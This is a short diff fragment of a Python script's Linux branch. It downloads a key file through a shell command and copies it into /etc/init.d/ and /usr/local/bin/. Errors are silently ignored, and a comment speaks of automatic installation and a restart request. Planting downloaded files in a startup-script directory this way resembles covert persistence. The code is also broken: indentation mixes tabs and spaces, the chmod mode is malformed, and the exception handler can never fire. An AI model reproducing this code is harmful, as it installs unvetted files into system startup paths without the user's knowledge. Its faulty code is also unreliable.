@@ -73,10 +73,10 @@ if platform.system() == "Linux":
 		# automatic installation will kick-in followed by a request to restart the PC
 		try:
 		    subprocess.Popen(DownloadPEM, shell=True).wait()
-		    print("[*] Downloading ssh .PEM file from site and installing...")
-		    subprocess.Popen("chmod +400 *.pem", shell=True).wait()
-                    subprocess.Popen("cp *.pem /etc/init.d/", shell=True).wait()
-                    subprocess.Popen("cp *.pem /usr/local/bin/", shell=True).wait()
+		    print("[*] Downloading ssh .PUB file from site and installing...")
+		    subprocess.Popen("chmod +400 *.pub", shell=True).wait()
+                    subprocess.Popen("cp *.pub /etc/init.d/", shell=True).wait()
+                    subprocess.Popen("cp *.pub /usr/local/bin/", shell=True).wait()
 		except subprocess.CalledProcessError as e:
 		    pass
 
